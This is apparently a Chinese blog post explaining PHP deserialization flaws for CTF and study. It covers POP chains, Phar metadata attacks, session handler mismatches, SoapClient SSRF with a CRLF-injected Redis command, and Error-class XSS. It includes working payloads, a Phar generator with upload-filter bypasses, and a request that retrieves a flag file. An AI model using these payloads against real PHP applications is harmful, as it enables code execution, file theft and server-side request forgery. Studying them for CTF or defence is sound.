---
title: PHP反序列化总结
tags:
  - 知识点总结
  - PHP反序列化
categories:
  - PHP
  - 反序列化
description: PHP unserialize Summary
excerpt: PHP unserialize Summary
typora-root-url: PHP反序列化总结
abbrlink: 64706
date: 2022-05-06 11:56:03
---

## PHP反序列化漏洞总结

> 找实习时被问到了相关问题，虽说前前后后还是能答出来，但是感觉有些东西已经忘的差不多了，答的不利索，索性直接写一篇总结博文好了。

### PHP反序列化漏洞概述

PHP反序列化一直是CTF竞赛中的宠儿吧，自己做CTF题目时时常会做到PHP的题目，但凡是PHP的题目，反序列化一般都少不了。

而国内的ThinkPHP、Yii等框架时不时会爆出反序列化利用，相比起Java，PHP更受中小型企业的青睐，快速开发、维护成本低等等特性使其成为一门很优秀的语言。

### PHP反序列化基础

#### PHP类与对象

在学习编程语言时，应该能了解到`类是定义一系列属性和操作的模板`，`对象是类的实例化`。

来看一个简单的例子：

```php
<?php
class Person
{
    public $name;
    public function eat()
    {
        echo $this->name . " eat something..." . "<br>";
    }
    public function sleep()
    {
        echo $this->name . " sleeping..." . "<br>";
    }
    public function __construct($name)
    {
        $this->name = $name;
    }
}

$person = new Person("Zhangsan");
$person->eat();
$person->sleep();
```

其输出为：

```bash
Zhangsan eat something...
Zhangsan sleeping...
```

上面的代码非常简单，定义了一个`Person`类，在`Person`类中定义了`name`成员变量和`eat`、`sleep`成员函数。

而后实例化了一个`Person`对象，然后依次调用`eat`和`sleep`函数，进行输出。

#### PHP魔术方法

值得一提的是，几乎所有的高级语言都支持魔术方法，但是叫法不一。

例如python中，`__repr__`、`__item__`等等函数都是魔术方法，在PHP中，常见的魔术方法及其调用机制如下：

|     方法名     |                             作用                             |
| :------------: | :----------------------------------------------------------: |
| __construct()  |   构造函数，在创建对象时候初始化对象，一般用于对变量赋初值   |
|  __destruct()  | 析构函数，和构造函数相反，在对象不再被使用时(将所有该对象的引用设为null)或者程序退出时自动调用 |
|  __toString()  | 当一个对象被当作一个字符串被调用，把类当作字符串使用时触发，返回值需要为字符串，例如echo打印出对象就会调用此方法 |
|   __wakeup()   |    使用unserialize时触发，反序列化恢复对象之前调用该方法     |
|   __sleep()    | 使用serialize时触发 ，在对象被序列化前自动调用，该函数需要返回以类成员变量名作为元素的数组(该数组里的元素会影响类成员变量是否被序列化。只有出现在该数组元素里的类成员变量才会被序列化) |
|    __call()    | 在对象中调用不可访问的方法时触发，即当调用对象中不存在的方法会自动调用该方法 |
| __callStatic() |            在静态上下文中调用不可访问的方法时触发            |
|    __get()     | 读取不可访问的属性的值时会被调用（不可访问包括私有属性，或者没有初始化的属性） |
|    __set()     |   在给不可访问属性赋值时，即在调用私有属性的时候会自动执行   |
|   __isset()    |          当对不可访问属性调用isset()或empty()时触发          |
|   __unset()    |              当对不可访问属性调用unset()时触发               |
|   __invoke()   |               当脚本尝试将对象调用为函数时触发               |
|   __clone()    |                        克隆对象时调用                        |
| __set_state()  |                       调用var_export时                       |
|  __autoload()  |       实例化一个对象时，如果对应的类不存在，调用该方法       |

其中`__toString`的触发场景由很多，简单的提一下，只要是当作字符串处理时就会调用：

1. echo/print
2. 对象与字符串连接
3. 对象参与字符串格式化
4. 对象与字符串进行==比较
5. 对象作为SQL语句参数绑定时
6. 作为PHP字符串函数参数，如strlen、addslashes
7. 对象作为class_exists参数时

> 顺口提一句，面试时被问到了实例化对象过程中魔术方法的调用顺序，这里实际上个人感觉能说的不多，把常规的魔术方法都说说就行，但是构造和析构肯定是必须提及的。

来看一个简单的样例：

```php
<?php
class Person
{
    private $name;

    public function __wakeup()
    {
        echo "<hr>";
        echo "Call __wakeup";
    }

    public function __construct(String $name)
    {
        $this->name = $name;
        echo "<hr>";
        echo "Call __construct";
    }

    public function __destruct()
    {
        echo "<hr>";
        echo "Call __destruct";
    }

    public function __toString()
    {
        echo "<hr>";
        echo "Call __toString";
        return $this->name;
    }

    public function __set($name, $value)
    {
        echo "<hr>";
        echo "Call __set";
    }

    public function __get($name)
    {
        echo "<hr>";
        echo "Call __get";
    }

    public function __invoke()
    {
        echo "<hr>";
        echo "Call __invoke";
    }
}

$person = new Person("Zhangsan");// __construct
$person->sex = 'Man';	// __set
echo $person->name;	// __get
$s = "Welcome, " . $person;	// __toString
$per_s = serialize($person);	// nothing happen
print_r(unserialize($per_s));	//__wakeup
$person();	// __invoke
// after all, call __destruct
```

对应的输出为：

![image-20220506124430759](./image-20220506124430759.png)

参照代码应该不难理解。

#### PHP的序列化与反序列化

##### 序列化

在开发过程中，将对象或者数组之类的数据进行存储是一个十分常见的情况。

在这种需求下，序列化对象与反序列化几乎是刚需，PHP提供的常规序列化相关的方式有：

* serialize、unserialize、json_encode、json_decode

来看个序列化的样例：

```php
<?php
class Obj
{
    public $property1 = 'ppt1';
    private $property2 = 'ppt2';
    protected $property3 = 'ppt3';

    function func()
    {
    }
}

$o = new Obj();
echo serialize($o);
```

其对应的输出为：

```bash
O:3:"Obj":3:{s:9:"property1";s:4:"ppt1";s:14:"Objproperty2";s:4:"ppt2";s:12:"*property3";s:4:"ppt3";}
```

简单说一下序列化的结果，`o:3:"Obj":3`的`o`表示这是一个对象，`3`表示类名长度为3，`"Obj"`表示类名为`Obj`，而后的`3`表示该对象有三个属性，接下来的大括号内的内容就是属性内容，格式为`type:length:value`，`s`表示是一个String类型。

这里应该可以注意到，使用不同修饰符进行修饰的变量，其序列化后的长度和名称发生了变化：

* public：正常长度
* private：长度+类名称+2
* protected：长度+1(*)+2

这里估计有很多人会疑惑这里的+2怎么来的。

将输出结果URL编码后的结果是这样子的：

```bash
O%3A3%3A%22Obj%22%3A3%3A%7Bs%3A9%3A%22property1%22%3Bs%3A4%3A%22ppt1%22%3Bs%3A14%3A%22%00Obj%00property2%22%3Bs%3A4%3A%22ppt2%22%3Bs%3A12%3A%22%00%2A%00property3%22%3Bs%3A4%3A%22ppt3%22%3B%7D
```

为了方便观看，只编码关键部分：

```bash
O:3:"Obj":3:{s:9:"property1";s:4:"ppt1";s:14:"%00Obj%00property2";s:4:"ppt2";s:12:"%00*%00property3";s:4:"ppt3";}
```

应该可以看到，在类名或者`*`前后都有一个`%00`，这是用于区分划分属性名所设置的，占两个字符。

给出常规序列化的`type`：

| tpye |       含义        |
| :--: | :---------------: |
|  a   |       array       |
|  d   |      double       |
|  o   |   common object   |
|  s   |      string       |
|  O   |       class       |
|  R   | pointer reference |
|  b   |      boolean      |
|  i   |      integer      |
|  r   |     reference     |
|  C   |   custom object   |
|  N   |       null        |
|  U   |  unicode string   |

##### 反序列化

这里拿刚刚的字符来反序列化：

```php
$data = urldecode('O:3:"Obj":3:{s:9:"property1";s:4:"ppt1";s:14:"%00Obj%00property2";s:4:"ppt2";s:12:"%00*%00property3";s:4:"ppt3";}');
var_dump(unserialize($data));
```

其结果如图：

![image-20220506131347521](./image-20220506131347521.png)

### PHP反序列化漏洞分析

#### POP链

##### 一个简单的反序列化漏洞

来看一个十分简单的案例：

```php
<?php

class Evil
{
    var $code = 'echo "Hello World!";';
    function __destruct()
    {
        @eval($this->code);
    }
}

$obj = unserialize($_GET['data']);
```

这里的代码十分简单，可以看到，代码反序列化了传入的GET参数data，但是代码中存在一个类Evil，可能被恶意利用。

当我们传入的data是`O:4:"Evil":1:{s:4:"code";s:10:"phpinfo();";}`，此时：

![image-20220506132128300](./image-20220506132128300.png)

而其原因是什么呢？

反序列化的对象的code成员实际上是一个`String="phpinfo();"`，在该对象析构时则调用了Eval函数从而执行任意代码。

从这里不难分析出，PHP反序列化漏洞的利用条件：

1. unserialize函数的参数可控
2. 存在一个合适的魔术方法作为`跳板`
3. 能够将程序流程导向恶意流程

##### POP链构造

POP构造最主要是利用魔术方法，然后在魔术方法中调用其他函数，通过寻找相同名字的函数，再与类中的敏感函数和属性相关联，这样就可以通过控制反序列化字符串达到利用反序列化漏洞的目的。

##### 技巧性的东西

主要关注POP链可能利用的方法：

```php
命令执行：exec()、passthru()、popen()、system()
文件操作：file_put_contents()、file_get_contents()、unlink()
代码执行：eval()、assert()、call_user_func()
```

大S绕过：

```php
s:4:"user";
// equal
S:4:"use\72";
```

使用大S，后面的字符就支持16进制表示。

如果可以进行文件读取或者其他文件操作，可以考虑使用PHP伪协议。

##### 例子

看一个简单的例子：

```php
<?php
//flag is in flag.php
error_reporting(1);
class Read {
    public $var;
    public function file_get($value)
    {
        $text = base64_encode(file_get_contents($value));
        return $text;
    }
    public function __invoke(){
        $content = $this->file_get($this->var);
        echo $content;
    }
}

class Show
{
    public $source;
    public $str;
    public function __construct($file='index.php')
    {
        $this->source = $file;
        echo $this->source.'Welcome'."<br>";
    }
    public function __toString()
    {
        return $this->str['str']->source;
    }

    public function _show()
    {
        if(preg_match('/gopher|http|ftp|https|dict|\.\.|flag|file/i',$this->source)) {
            die('hacker');
        } else {
            highlight_file($this->source); 
        }

    }

    public function __wakeup()
    {
        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
            echo "hacker";
            $this->source = "index.php";
        }
    }
}

class Test
{
    public $p;
    public function __construct()
    {
        $this->p = array();
    }

    public function __get($key)
    {
        $function = $this->p;
        return $function();
    }
}

if(isset($_GET['hello']))
{
    unserialize($_GET['hello']);
}
else
{
    $show = new Show('pop3.php');
    $show->_show();
}
```

从这个例子来看一下这里的pop链构造的技巧。

首先先注意，上面的代码一共有三个类，分别为`Read`、`Show`和`Test`，容易发现在类`Read`中，其`__invoke`方法读取了`$value`路径的文件并显示。

我们的目的是去取得Flag，而题目提示flag在flag.php中，因此我们这里最终利用的肯定是这里的`Read`类的`__invoke`方法了。

在前面的魔术方法总结中提到过，当 一个对象被当成函数执行时，就会调用其`__invoke`方法。

那么接下来去审查一下代码，看看哪个地方将对象作为了函数调用(在PHP中，弱类型会导致这里的寻找过程比较困难，需要耐心)，不难看到，在`Test`类中，其`__get`方法这里，直接将`$this->p`赋给了`$function`，随后调用了`$function`，也就是相当于`return $this->p();`，那么我们只需要控制这里的`$this->p`为`Read`对象。

这里的话，注意到，我们已经连起来了一条链了`Test::__get ==> Read::__invoke`。

那么我们如何去触发`Test::__get`呢？也是前面的魔术方法提到过的，`__get`方法是读取不可访问属性时调用的。去寻找时应该可以发现，在`Show::__toString`中，获取了`$this->str['str']->source`，那么在这里，如果`$this->str['str']`的`source`属性是不可访问属性的话，就会调用其对象的`__get`方法。

那么在这里，就向已经存在的链加上一个：`Show::__toString ==> Test::__get ==> Read::__invoke`。

接下来需要考虑的是，`Show::__toString`是如何调用的呢？

可以注意到，在`Show::__wakeup`中，将`$this->source`视为字符串进行了`preg_match`，这里显然会调用其对应的`__toString`方法，于是构成了：

```php
Show::__wakeup ==> Show::__toString ==> Test::__get ==> Read::__invoke
```

从上面的构造链来看，这就让反序列化时可以让攻击者走向最终读取文件并回显的函数。

接下来看看怎么从上面的链来构造Payload，首先，虽然分析是从后往前进行分析的，但是构造肯定是从前往后构造的，我个人喜欢是先生成所有的对象，再去一一设置成员关系，所以这里肯定是要先去分析这里一共有几个对象。

从上面的构造链来看，三个类，那么至少是三个对象，有没有可能有更多呢？有，在这里需要四个，为什么呢？因为注意看导向到`__toString`方法的前提是，`Show::this->source`也是一个`Show`对象，这才会调用其对应的`__toString`。

首先构造三个对象：

```php
class Read
{
    public $var;
}

class Show
{
    public $source;
    public $str;
}

class Test
{
    public $p;
}

$show = new Show();
$show2 = new Show();
$test = new Test();
$read = new Read();
```

接下来从前往后进行填充数据，首先是`Show`对象，反序列化时会自动调用其`__wakeup`方法，这里会直接导向到它的`source`的`__toString`，那么在`Show::__toString`中呢，访问的是`$this->str['str']->source`，前面分析这里是调用`__get`的点，那么这两个`Show`对象填充起来就没什么问题了。

```php
$show->source = $show2;
$show2->str = array('str' => $test);
```

接下来看`Test`是怎么填充的，注意这里已经是到了`Test::__get`方法，这里只需要将`$this->p`设为一个`Read`对象即可调用`Read::__invoke`，于是：

```php
$test->p = $read;
```

再看最后的`Read`对象，这里就没啥好说的了，直接设置其`$var`即可：

```php
$read->var = 'flag.php';
```

然后组合起来，并且将其进行序列化可以得到：

```php
<?php
class Read
{
    public $var;
}

class Show
{
    public $source;
    public $str;
}

class Test
{
    public $p;
}

$show = new Show();
$show2 = new Show();
$test = new Test();
$read = new Read();

$show->source = $show2;
$show2->str = array('str' => $test);
$test->p = $read;
$read->var = 'flag.php';
echo serialize($show);
// O:4:"Show":2:{s:6:"source";O:4:"Show":2:{s:6:"source";N;s:3:"str";a:1:{s:3:"str";O:4:"Test":1:{s:1:"p";O:4:"Read":1:{s:3:"var";s:8:"flag.php";}}}}s:3:"str";N;}
```

```powershell
$ Invoke-WebRequest -Uri http://localhost/ -Method Get -Body @{hello='O:4:"Show":2:{s:6:"source";O:4:"Show":2:{s:6:"source";N;s:3:"str";a:1:{s:3:"str";O:4:"Test":1:{s:1:"p";O:4:"Read":1:{s:3:"var";s:8:"flag.php";}}}}s:3:"str";N;}'} | Select-Object content
Invoke-WebRequest: PD9waHANCiRmbGFnID0gJ0ZMQUd7YzY0MTk5MTY3NGIwMDYzNjdjYTM0MDA3YjM0ODc1NWM1ZmFiMDAyZH0nOw0K
```

解码后就拿到了Flag.php的代码。

##### POP链的总结

上面只是一个最简单的样例，实际上，在ThinkPHP中、Yii中，有很多的类、很多的方法，如何在确定反序列化点存在时，我们可以通过ThinkPHP或者Yii这一框架去直接进行POP链的构造，去直接利用，这才是一个难点。在哪儿有`eval`、`assert`等危险函数，怎么一步一步跳转到这个函数去进一步利用，在海量的代码前面怎么做，这才是难点所在。

#### Phar反序列化

##### Phar概述

Phar的本质是一个压缩文件，反序列化攻击的核心是其中`序列化存储的用户自定义的meta-data`。

##### Phar文件结构

* stub: phar文件标志，必须是以`xxx __HALT_COMPILER();?>`结尾，否则无法识别，`xxx`可自定义
* manifest: phar压缩信息
* content: 被压缩文件的内容
* signature(可空): 签名，末尾处

##### Phar的生成

使用PHP代码即可生成Phar，相当方便，样例如下：

```php
<?php
class Test
{
}

$phar = new Phar("phar.phar");
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>");

$obj = new Test();
$obj->name = 'test';
$phar->setMetadata($obj);
$phar->addFromString("flag.php", "flag");

$phar->stopBuffering();
```

> 注意：需要将phar.readOnly设为Off

生成的Phar文件如下：

![image-20220516140952026](./image-20220516140952026.png)

可以看到，这里的`Test`对象设置进去时时经过了序列化的。

##### Phar读取时反序列化meta-data受影响函数

Phar在读取`meta-data`必然会存在一个反序列化过程，用于还原对象，那么这里就容易使用反序列化攻击造成RCE。

受影响的函数列表如下：

|       fileatime       |     filectime     |   file_exists    | file_get_contents  |
| :-------------------: | :---------------: | :--------------: | :----------------: |
| **file_put_contents** |     **file**      |  **filegroup**   |     **fopen**      |
|     **fileinode**     |   **filemtime**   |  **fileowner**   |   **fileperms**    |
|      **is_dir**       | **is_executable** |   **is_file**    |    **is_link**     |
|    **is_readable**    |  **is_writable**  | **is_writeable** | **parse_ini_file** |
|       **copy**        |    **unlink**     |     **stat**     |    **readfile**    |

相关的一些具体分析可以见[Phar与Stream Wrapper造成PHP RCE的深入挖掘 - zsx's Blog (zsxsoft.com)](https://blog.zsxsoft.com/post/38)，该文章对于PHP源代码进行了分析，分析了为什么能造成RCE。

上面的表格是没有整理完成的，这里的话，还要下面的方式都可以利用：

* EXIF

  * exif_thumbnail
  * exif_imagetype

* gd

  * imageloadfont
  * imagecreatefrom***

* hash

  * hash_hmac_file
  * hash_file
  * hash_update_file
  * md5_file
  * sha1_file

* file/url

  * get_meta_tags
  * get_headers

* standard

  * getimagesize
  * getimagesizefromstring

* zip

  ```php
  $zip = new ZipArchive();
  $res = $zip->open('test.zip');
  $zip->extractTo('phar://test.phar/test');
  ```

* Bzip / Gzip

  ```php
  $z = 'compress.bzip2://phar://test.phar/test';
  $z = 'compress.zlib://phar://test.phar/test'
  ```

* Postgres

  ```php
  <?php
  $pdo = new PDO(sprintf("pgsql:host=%s;dbname=%s;user=%s;password=%s", "127.0.0.1", "postgres", "sx", "123456"));
  @$pdo->pgsqlCopyFromFile('aa', 'phar://test.phar/aa');
  ```

  > 如果使用pgsqlCopyToFile或者pg_trace，需要开启对应的phar写功能

* MySQL

  ```php
  <?php
  class A {
      public $s = '';
      public function __wakeup () {
          system($this->s);
      }
  }
  $m = mysqli_init();
  mysqli_options($m, MYSQLI_OPT_LOCAL_INFILE, true);
  $s = mysqli_real_connect($m, 'localhost', 'root', '123456', 'easyweb', 3306);
  $p = mysqli_query($m, 'LOAD DATA LOCAL INFILE \'phar://test.phar/test\' INTO TABLE a  LINES TERMINATED BY \'\r\n\'  IGNORE 1 LINES;');
  ```

  配置`mysqld`为：

  ```ini
  [mysqld]
  local-infile=1
  secure_file_priv=""
  ```

##### 简单的Phar反序列化

假设现在有一个任意文件上传漏洞，并且有一个页面的代码如下：

```php
<?php

class Test
{
    public $data = 'echo "hello world!"';
    function __wakeup()
    {
        eval($this->data);
    }
}
if ($_GET['file']) {
    echo file_exists($_GET['file']);
}
```

那么这样如何利用呢？

结合前面的POP利用，应该不难得出：

```php
<?php
class Test
{
}
$phar = new Phar("phar.phar");
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$o = new Test();
$o->data = "echo 'RCE';";
$phar->setMetadata($o);
$phar->addFromString("test.txt", "test");
$phar->stopBuffering();
```

上传Phar，并且传入`file=phar://phar.phar`，这就可以完成一次反序列利用。

假如只有图片上传接口时，这个时候我们可以自己在文件中添加对应的头部，这不会影响正常的Phar解析。

例如：

```php
$phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>");
```

那如果，现在我们传入的file不允许以phar开头呢？

当然也是有办法的：`file=compress.bzip2://phar://phar.phar`

#### Session反序列化

在开始前，需要简单介绍一下PHP的Session机制。

##### PHP的Session机制

在Web Application中，会话控制或者说会话保持是一个非常重要的操作，也是授权体系的重要需求。

PHP使用`Session_start`创建一个唯一的`Session ID`，并且自动通过HTTP响应头设置其对应的Cookie；创建是在用户请求中的Cookie没有对应的`Session ID`才会创建的。

> 在上面的机制下，用户可以自行设置对应的Session ID。

在Session中，有几个重要的参数：

|              参数               |                        含义                        |
| :-----------------------------: | :------------------------------------------------: |
|      session.save_handler       |            session保存形式、默认为files            |
|        session.save_path        |                  session保存路径                   |
|    session.serialize_handler    |       session序列化存储所用处理器，默认为PHP       |
| session.upload_progress.cleanup | 一旦读取了所有POST数据，立即清除进度信息。默认开启 |
| session.upload_progress.enabled |    将上传文件的进度信息存在session中。默认开启     |

PHP对于session的处理有不同的Handler，如下：

|    Handler    |                   存储格式                   |
| :-----------: | :------------------------------------------: |
|      php      |           键名+竖线+serialize数据            |
|  php_binary   | 键名的长度对应的ASCII字符+键名+serialize数据 |
| php_serialize |                serialize数据                 |

三种handler对应如下代码：

```php
session_start();
$_SESSION['name'] = 'evalexp';
```

其对应的Session文件内容：

|    Handler    |             Session             |
| :-----------: | :-----------------------------: |
|      php      |      name\|s:7:"evalexp";       |
|  php_binary   |       names:7:"evalexp";        |
| php_serialize | a:1:{s:4:"name";s:7:"evalexp";} |

##### Session反序列化的漏洞原因

PHP本身实现的Session是没有问题的，问题出在了开发者使用Session上。如果开发者在存储Session数据和读取Session数据时所使用的Handler不一致，就将导致无法正确地反序列化，从而导致被反序列化攻击。

看一个简单的案例：

```php
$_SESSION['hello'] = '|O:8:"stdClass":0:{}';
```

当使用`php_serialize`进行序列化时，得到的Session如下：

```php
a:1:{s:5:"hello";s:20:"|O:8:"stdClass":0:{}";}
```

如果这个数据使用的Handler为`php`时，注意`php handler`是以`|`分割的，这就导致了不正确的反序列化：

```php
$_SESSION['a:1:{s:5:"hello";s:20:"'] = object(stdClass){}
```

实际利用的话，主要得看被攻击端的设置：

* **session.auto_start**

当这一个选项为On时，开发者应该在Session处理时，在开头加入这样的代码：

```php
if(ini_get('session.auto_start')) {
    session_destroy();
}
```

然后再去自己处理Session，如果没有对应的处理，如下面简单的样例：

```php
// index.php
<?php
if (ini_get('session.auto_start')) {
    session_destroy();
}

ini_set('session.serialize_handler', 'php_serialize');
session_start();

if (isset($_GET['test'])) {
    $_SESSION['test'] = $_GET['test'];
}
```

```php
// test.php
<?php
var_dump($_SESSION);
```

此时我们向`index.php`传入：`test=|O:8:%22stdClass%22:0:{}`，然后再访问`test.php`。

此时得到的结果是这样的：`array(1) { ["a:1:{s:4:"test";s:20:""]=> object(stdClass)#1 (0) { } }`

当上述的设置为Off时，实际上就需要有两个页面指定的处理器不相同时才能完成反序列化攻击。

##### session.upload_progress利用

PHP 5.4以上，PHP为了提供文件上传的基础信息，会在Session文件里存储文件上传的进度。

默认的选项有如下：

* session.upload_progress.enabled = on  // 启用上传进度信息记录
* session.upload_progress.cleanup = on  // 文件上传结束后，php立即清除session内容
* session.upload_progress.prefix = "upload_progress_"
* session.upload_progress.name = "PHP_SESSION_UPLOAD_PROGRESS"
* session.upload_progress.freq = "1%"
* session.upload_progress.min_freq = "1"

当Name为PHP_SESSION_UPLOAD_PROGRESS(实际上即Name与session.upload_progress.name同名即可)的字段出现在表单中时，PHP就会报告上传进度，并且这个的值时可控的。当PHP检测到字段时，会向Session文件写入一个键值对，其键为prefix+name，其值为我们的值。

所以这就让我们能够向服务器写入一些恶意的字符串，自然可以包含一些恶意的序列化数据，让其反序列化时造成RCE。

> 这里自然也可以通过LFI进行RCE。

#### PHP原生反序列化利用

##### SoapClient

PHP的`SoapClient`类可以创建Soap数据报文，与WSDL接口进行交互，其定义如下：

```php
public SoapClient::SoapClient ( mixed $wsdl [, array $options ] )
```

其类摘要可见[PHP: SoapClient - Manual](https://www.php.net/manual/zh/class.soapclient.php)。

调用其`__call`方法时，可以发送HTTP或者HTTPS请求，从而造成SSRF。

其POC如下：

```php
<?php
$target = 'http://127.0.0.1:12345';
$post_string = 'a=b&flag=aaa';
$headers = array(
    'X-Forwarded-For: 127.0.0.1',
    'Cookie: xxxx=1234'
);
$b = new SoapClient(null, array('location' => $target, 'user_agent' => 'wupco^^Content-Type: application/x-www-form-urlencoded^^' . join('^^', $headers) . '^^Content-Length: ' . (string)strlen($post_string) . '^^^^' . $post_string, 'uri'      => "aaab"));

$aaa = serialize($b);
$aaa = str_replace('^^', '%0d%0a', $aaa);
$aaa = str_replace('&', '%26', $aaa);

unserialize(urldecode($aaa))->a();
```

可以看到NC接受到的数据如下：

![image-20220516164609221](./image-20220516164609221.png)

这一个的SSRF只能使用HTTP协议，因此在实战中可能用处不大，但是如果HTTP头部存在CRLF漏洞的话，可以利用该漏洞去访问Redis从而GetShell。

如下面的代码：

```php
$poc = "CONFIG SET dir /root/";
$target = 'http://127.0.0.1:12345';

$soap = new SoapClient(null, array('location' => $target, 'uri' => 'hello^^' . $poc . '^^hello'));

$ser_soap = serialize($soap);
$ser_soap = str_replace('^^', "\n\r", $ser_soap);

unserialize($ser_soap)->hello();
```

可以得到：

![image-20220516165907038](./image-20220516165907038.png)

##### Error/Exception

Error是一个内置类，在PHP7环境下可能导致XSS，因为有一个内置的`__toString`方法

Exception类的原理与Error类一样，但是在PHP5中适用。

例如Error类的利用：

```php
<?php
$error = new Error("<script>alert('XSS');</script>");
$data = serialize($error);

echo unserialize($data);
```

这就引发了XSS注入。

#### 反序列化字符逃逸

在前面的总结里应该都看到过PHP序列化后的字符串，都会以一个Int标注属性的长度，这为解析提供了方便。

字符逃逸的本质实质上和注入差不多，都是通过闭合，让字符逃逸，分为两种情况，分别为字符变多、字符变少（应用于对输入有过滤或者处理的情况）。

##### 字符增多

字符增多就是后端对我们输入的序列化后的字符进行替换称为长度更长的字符。

这个的处理相对简单，修改对应的长度即可，比如说将p替换为了WW，那么就将`s:1:"p"`换成`s:2:"p"`，换完之后长度能够正常反序列化即可。

##### 字符减少

与上面相反，服务端替换为了更短的字符串，这就为我们提供了遍历，只需要利用这一特性往里面加入被替换的字符串，就可以为我们留出自己的恶意串的位置。
